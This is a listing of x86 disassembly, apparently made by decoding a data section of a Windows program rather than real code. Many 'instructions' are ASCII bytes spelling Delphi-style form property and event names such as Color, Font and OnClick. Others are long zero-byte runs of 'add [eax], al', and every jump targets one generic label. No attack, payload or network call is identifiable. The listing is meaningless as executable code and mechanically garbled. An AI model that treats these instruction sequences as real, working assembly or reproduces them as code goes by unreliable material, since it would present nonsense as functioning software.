add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
adc [ eax ] al
jne r-xdata
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x336c7443
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
inc esp
add [ eax - 0x7 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
dec [ eax - 0x7 ]
jae r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ ecx ] al
mov bh 0x44
add [ ebp + 0x1 ] ah
add bh bh
fsubr [ ebp + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
nop
mov [ 0x10043 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al [ eax ]
push cs
add bh bh
outsd
outsb
je r-xdata
and [ ecx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esi
insb
popad
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
push ds
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6b00ffff ] ah
popad
inc ebp
add [ eax + 0x4561 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
je r-xdata
add bh bh
dec eax
jb r-xdata
add bh bh
je r-xdata
add [ edi + 0x16c0044 ] dh
sub [ edx ] eax
add [ eax ] bh
add al [ eax ]
[ eax + 0x10043a7 ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ eax + 0x4518 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
inc edx
add [ eax ] ch
add [ gs : eax ] dl
add bh bh
jpe r-xdata
xor eax [ eax + esi - 0x5f ]
inc esp
add [ edx ] bh
add [ edx + eax ] dh
add bh bh
shl [ edi + 0x10043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490b0029 ] al
jb r-xdata
js r-xdata
add [ eax ] dl
inc eax
add [ esi + 0x2 ] dh
add bh bh
movsb [ edi ] [ esi ]
mov [ 0x10043 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
inc esp
add al [ eax ]
imul ebp [ edi + 0x6e ] 0x432a5c73
add [ edx + eax ] ch
dec edi
jo r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ ecx + 0x63 ]
outsd
outsb
arpl [ ebx + 0x20 ] bp
das
inc ebx
add [ ecx + 0x2 ] bh
add bh bh
adc al 0xa3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ esi ] cl
dec eax
outsd
je r-xdata
add [ ebx + 0x10043 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ es : eax ] cl
dec eax
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x69480d00
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + 0x2 ] bh
add [ bx + si ] dl
inc eax
add [ edi + 0x2 ] dh
add bh bh
in al dx
mov [ 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x0
or [ edi + 0x72 ] eax
imul esp [ esp + ecx * 2 + 0x69 ] 0x73656e
adc [ eax ] al
cmp [ edx ] al
add bh bh
cwde
cmpsd [ esi ] [ edi ]
inc ebx
add [ ecx ] al
add [ 0x774f0900 ] ch
insd
jae r-xdata
add bh bh
sar [ esi - 0x3037ffbd ] 0x1
inc ebx
pop esp
sub al [ ebx ]
sub al 0x2
jb r-xdata
popad
dec edi
outsb
insb
jns r-xdata
popad
je r-xdata
add [ ecx ] cl
dec edi
ja r-xdata
enter 0x45 0x18
add al [ eax ]
jmp [ edi + edi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905002a ] al
je r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
adc [ eax ] al
jpe r-xdata
or [ edx + 0x6f ] edx
ja r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] al
add bh bh
push 0x10043a3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ cs : ecx ] cl
dec edi
ja r-xdata
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
push cs
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ ecx + 0x72 ]
dec ecx
insd
popad
jae r-xdata
insb
jae r-xdata
jl r-xdata
add bh bh
jb r-xdata
insb
inc edx
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
sub [ edx ] al
add bh bh
hlt
arpl [ edi + 0x6e ] bp
add [ ebx ] cl
dec ecx
adc [ eax ] al
mov ah 0xcf
inc ebx
add [ eax + 0x10043cf ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
sub eax 0x774f0900
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
adc [ eax ] al
pop ecx
add [ eax ] al
inc [ eax + 0x10044f9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax [ eax ]
or dl [ eax + 0x61 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6f500900
outsb
je r-xdata
push ebx
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
aaa
add [ 0x776f6853 ] cl
push edi
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ ebx ] dh
add [ edx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
cli
inc esp
add [ ecx ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
push eax
popad
jb r-xdata
add [ esi ] cl
ja r-xdata
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
or edx [ ebx + 0x6d ]
outsb
dec eax
popad
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
je r-xdata
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
enter 0x45 0x1c
add al [ eax ]
call [ eax + eax * 8 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b0039 ] al
insd
ja r-xdata
outsb
jne r-xdata
adc [ eax ] al
push ss
add al [ eax ]
[ edi + 0x10043 ]
add al [ eax ]
[ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
inc ebx
add [ eax ] dl
inc eax
add [ edx + eax - 0x31c30100 ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
0x7c0045 0xff00
add al [ eax ]
[ edi + edi * 4 ]
add [ ecx ] ch
inc ebx
xor al 0x0
adc [ eax ] al
0xc8ff0000 0x44f9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
add bh bh
sbb al 0xbf
outsd
jb r-xdata
add [ ss : ecx ] dl
push ebx
push 0x6f43776f
insb
jne r-xdata
adc [ eax ] al
sub eax [ edx ]
add bh bh
cmp al 0xa4
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
push esi
imul esp [ ebp + 0x77 ] 0x6c797453
adc eax 0x28ff0002
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
enter 0x45 0x20
add al [ eax ]
dec [ eax + eax * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or edx [ ebx + 0x74 ]
popad
adc [ eax ] al
cdq
add [ eax ] al
jmp [ ecx + edi * 8 - 0x693ffbc ]
adc [ eax ] al
push edi
add [ eax ] al
push [ edi + esi * 8 + 0x44 ]
add al ch
sbb [ ebp ] al
add [ eax ] al
add [ eax + 0x1 ] al
aas
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xac656c62
xor al 0x43
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140040 ] al
outsb
inc ecx
jbe r-xdata
inc esp
or [ esi + 0x69 ] edx
ja r-xdata
dec ecx
insd
popad
jae r-xdata
popad
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
popad
je r-xdata
test al 0x44
add al dh
popad
inc ebp
add [ eax + 0x62 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ 0x6f436e4f ] cl
insb
jne r-xdata
je r-xdata
add al al
add al [ eax ]
je r-xdata
inc ebx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
xor eax 0x2b00043
add bh bh
mov al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ eax ] bl
dec edi
outsb
inc ecx
jbe r-xdata
jne r-xdata
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
je r-xdata
insb
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ ecx ] cl
dec edi
outsb
inc ebx
outsd
insd
jo r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edi ] cl
dec edi
outsb
inc ebx
outsd
insb
jne r-xdata
dec edi
insd
inc esp
jb r-xdata
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
xor [ ebx ] al
rol [ edx ] 0x0
insd
inc esp
jb r-xdata
outsb
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
or [ ecx ] bl
inc ebp
add [ eax ] al
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
outsb
inc ebx
push 0x65676e61
xor [ eax ] 0x43
add [ eax ] cl
dec edi
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
outsb
inc ebx
push 0x69676e61
outsb
cmp [ bp + di + 0x41 ] bl
add [ eax ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10004c ] al
jb r-xdata
add [ eax ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
ja r-xdata
popad
ja r-xdata
add [ eax ] al
insd
inc esp
jb r-xdata
add [ edx ] cl
je r-xdata
outsb
inc ebx
jne r-xdata
add [ eax ] al
or [ eax + eax + 0x10 ] 0x4f
add [ eax + 0x4f0e004a ] al
adc al 0xb1
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
add [ ebx ] dl
dec edi
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ esi ] cl
dec edi
cmp al 0x31
inc ebx
add al ah
add al [ eax ]
jmp eax
add [ eax ] eax
jmp [ eax ]
jne r-xdata
add al cl
add al [ eax ]
dec eax
add al [ eax ]
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edx
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
sub [ ebx ] al
add bh bh
sub [ ebx ] al
add bh bh
inc esi
imul ebp [ esi + 0x64 ] r-xdata
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
or [ edi ] 0xa
insd
inc esp
jb r-xdata
je r-xdata
je r-xdata
inc ebx
jne r-xdata
push eax
outsd
jo r-xdata
add [ eax + 0x4f070045 ] al
dec ecx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
je r-xdata
imul esi [ ecx + ebp * 2 + 0x6e ] 0x44ac8067
add [ eax ] cl
outsd
outsb
mov ah 0x32
inc ebx
add [ eax ] dh
add eax [ eax ]
push [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ edx ] cl
dec edi
outsb
inc esp
insb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
and [ ebx ] al
add bh bh
and [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ecx
add [ ecx ] dl
outsb
inc esp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004f ] al
ja r-xdata
inc esp
insd
inc esp
jb r-xdata
jo r-xdata
insd
sub [ eax ] dh
inc ebx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f1b0042 ] al
outsb
inc ecx
jbe r-xdata
insd
fdiv [ 0x2b80043 ]
add bh bh
mov eax 0x1ff0002
inc edi
je r-xdata
cmp [ bp + di + 0x41 ] bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070059 ] al
outsb
inc ebp
outsb
je r-xdata
outsb
add [ eax ] al
adc [ edi ] 0x9
dec edi
ja r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ edx ] cl
dec edi
push ebx
je r-xdata
dec esi
add [ esi ] al
dec edi
je r-xdata
outsb
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
ja r-xdata
inc ebx
add al bh
add al [ eax ]
xor eax [ ebx ]
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
add [ ecx ] dl
dec edi
outsb
inc edi
je r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090057 ] al
sub [ si + 0x44 ] 0x8
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0054 ] al
je r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
adc [ ecx ] 0x11
loopne r-xdata
add [ eax ] al
outsb
insd
adc [ ebx + eax * 2 ] dh
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13004d ] al
[ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f080060 ] al
inc esp
jb r-xdata
add [ eax ] al
cmp [ ebx ] al
push eax
add eax [ eax ]
call [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop esp
jb r-xdata
jne r-xdata
pop ebx
add [ eax + 0x4f06005a ] al
outsb
inc ebp
js r-xdata
pop ebx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x80 ] bp
lodsb [ esi ]
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090058 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
insd
fsubr [ edi ]
inc ebx
add [ eax ] bh
add eax [ eax ]
add [ eax ] al
adc [ eax + eax + 0xa ] 0x4f
inc ebx
push 0x65676e61
cmp [ ebx + 0x41 ] bl
add [ eax ] ch
add [ eax ] eax
[ eax ]
inc ebx
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
inc [ ecx ]
push eax
add [ edx ] cl
dec edi
dec ecx
je r-xdata
pop es
dec edi
jb r-xdata
inc esp
add al bl
add [ eax ] eax
jo r-xdata
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
pop ebp
add [ edx ] cl
dec edi
je r-xdata
outsb
dec ecx
outsb
jae r-xdata
add [ eax ] cl
dec edi
cmp [ ebx ] eax
pop eax
add eax [ eax ]
[ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop edi
add [ ecx ] cl
outsb
dec ecx
outsb
outsw
push esp
imul esi [ eax + 0x40 ] 0x6000432f
add eax [ eax ]
jmp [ eax + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005f ] al
dec ecx
je r-xdata
popad
outsb
inc esp
popad
je r-xdata
insd
pushfd
inc ebx
add [ eax ] cl
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
loopne r-xdata
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0064 ] al
enter 0x44aa 0x0
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
add [ ecx ] cl
pushad
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosd [ edi ]
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005e ] al
outsb
inc esp
jb r-xdata
add [ edi ] cl
dec edi
outsb
xor al [ ebx ]
dec eax
add eax [ eax ]
dec [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ eax ] al
sbb [ edi ] 0x9
add [ eax + 0x4f0a005d ] al
insd
dec ecx
insd
popad
fsubr [ gs : bp + di + 0x44 ]
call 0xffffffffe94249a3
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsb
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070063 ] al
outsb
dec ebp
outsd
jne r-xdata
test eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ fs : ebx ] cl
dec edi
xor al [ ebx ]
push 0x68ff0003
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
outsd
ja r-xdata
outsd
ja r-xdata
dec edi
outsb
add [ eax ] al
and [ ecx ] 0x9
dec edi
jbe r-xdata
cmp [ esp + eax * 2 + 0x11000 ] ch
push ebp
jo r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
dec esp
sbb eax 0x1c000045
inc edx
jb r-xdata
stosb [ edi ]
inc esp
add al bl
add [ eax ] al
stosb [ edi ]
adc al 0xab
inc esp
add al ah
add [ eax ] eax
jmp eax
dec ebx
jns r-xdata
jb r-xdata
add [ eax + ebp * 8 + 0x44 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
jb r-xdata
add [ eax + 0x4f0c0068 ] al
outsb
push ebx
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
inc eax
scasb [ edi ]
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0069 ] al
outsb
push ebx
je r-xdata
pop ebx
inc ecx
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebp
inc ebx
inc ebx
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x14004032 ] ah
inc ebp
inc ebx
outsd
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax + 0x7c0044e7 ] bh
push cs
inc ebx
inc edx
add [ ebp + ebx + 0x45 ] cl
add [ eax ] al
sbb al 0x42
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b006a ] al
outsb
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx + 0x38 ] bp
lodsb [ esi ]
inc esp
add [ eax ] dl
add [ eax ] eax
out 0x44 eax
add ah ah
mov esi 0x1d700045
inc ebp
add [ eax + 0x4c0044e8 ] dl
out 0x44 eax
add [ edi + edi * 4 ] dh
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi - 0x408fffbc ] al
inc ebp
add al ah
out 0x44 eax
add [ eax - 0x41 ] bh
inc ebp
add [ eax ] al
call 0xffffffffbfc34c86
inc ebp
add [ eax + 0x1d ] bh
inc ebp
add ah dh
call 0xffffffffe9774c92
inc esp
add [ eax ] ah
call 0xffffffffbfd74c9a
inc ebp
add [ eax + 0x440045bf ] bl
call 0xffffffffe5f74ca6
inc esp
add [ esi + ecx ] bh
inc ebx
add al al
push cs
inc ebx
add [ eax + 0xe ] dl
inc ebx
add [ eax - 0x4 ] dl
inc ebx
add [ eax + edx - 0x3e7ffbd ] dh
inc ebx
add [ eax + 0x130043fb ] ah
push esp
dec esp
mov esp 0x180045be
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbe71 ] al
nop
inc ecx
add [ eax + 0x10004190 ] bl
aam 0x43
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
inc eax
jb r-xdata
add [ esp + ebx + 0x42 ] ch
add [ esi - 0x4143ffbc ] ah
inc ebp
add [ eax ] bl
test [ ebx ] bl
call sub_438eec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800434c ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] eax
loopne r-xdata
outsb
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
sub [ edx ] eax
adc [ eax ] al
add bh bh
sbb al 0xd5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
dec ebp
inc ebx
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
inc edx
add [ eax ] bl
sbb al 0x42
inc eax
add ah ch
xor al 0x40
add al dh
in al dx
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
jae r-xdata
inc edx
add [ eax + eax ] cl
sub [ edx ] eax
adc al 0x0
add bh bh
sbb al 0xd5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
inc edx
add [ eax ] dl
add [ eax ] al
[ edx * 8 + 0x10043 ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
imul esi [ ebx + 0x74 ] 0x77656956
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4d ] dl
inc ebx
add [ eax ] ah
add [ eax ] al
add ah cl
popad
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
inc eax
add [ ebp + ecx * 2 + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x43 ] ah
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
[ edx * 8 + 0x10043 ]
sub [ edx ] eax
sbb al 0x0
add bh bh
sbb al 0xd5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
add [ eax ] al
[ edx * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0xff0000
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ ecx + ebp + 0x80042 ] dh
add bh bh
sbb al 0xd5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xff0000 ] al
add bh bh
add al [ eax ]
push cs
inc esp
dec ebp
inc ebx
add [ eax + 0x62 ] al
inc ecx
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
int3
